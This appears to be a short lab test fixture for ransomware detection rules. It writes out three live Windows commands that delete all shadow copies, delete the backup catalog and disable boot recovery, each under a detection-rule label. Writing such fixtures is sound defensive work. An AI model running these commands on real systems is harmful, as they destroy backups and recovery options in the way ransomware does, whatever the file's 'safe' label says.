# LAB FIXTURE ONLY — not real malware.
# Simulates ransomware prep language for Sentinel class detection.
# Safe: does nothing harmful when read as text.

Write-Host "lab fixture - do not run on production"
# Pattern for RW-CLASS-SHADOW-DELETE:
# vssadmin delete shadows /all /quiet
vssadmin delete shadows /all /quiet

# Pattern for RW-CLASS-WBADMIN-CATALOG:
wbadmin delete catalog -quiet

# Pattern for RW-CLASS-BCD-RECOVERY:
bcdedit /set {default} recoveryenabled No
